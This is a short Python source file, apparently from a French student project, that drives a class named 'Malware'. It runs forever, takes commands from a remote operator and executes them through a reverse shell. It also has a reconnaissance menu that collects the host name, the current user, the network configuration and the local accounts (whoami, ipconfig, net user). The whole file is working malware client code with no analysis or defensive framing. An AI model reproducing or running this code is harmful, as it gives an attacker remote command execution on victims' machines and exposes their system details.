from Class_Projet import Malware
import os

"""
Fonction contenant le programme que nous ferons tourner indÃ©finimment
"""


def prog():
    malware = Malware()
    malware.start()

    choice = malware.receive()

    while choice != "0":
        if choice == "1":
            malware.send(os.getcwd() + "> ")
            cmd = malware.receive()
            while cmd != "quit" and cmd is not None and cmd != "menu":
                if cmd[:2] == "cd":
                    os.chdir(cmd[3:])

                malware.rev_shell(cmd)
                malware.send("\n" + os.getcwd() + "> ")
                cmd = malware.receive()
            if cmd == "menu":
                choice = malware.receive()
            else:
                choice = "0"

        elif choice == "2":
            cmd = malware.receive()
            while cmd != "quit" and cmd is not None and cmd != "menu":
                if cmd == "computer":
                    malware.send(os.environ["COMPUTERNAME"])
                elif cmd == "current":
                    malware.rev_shell("whoami")
                elif cmd == "network":
                    malware.rev_shell("ipconfig")
                elif cmd == "users":
                    malware.rev_shell("net user")
                cmd = malware.receive()
            if cmd == "menu":
                choice = malware.receive()
            else:
                choice = "0"
        else:
            choice = malware.receive()

    malware.quit()


while True:
    prog()
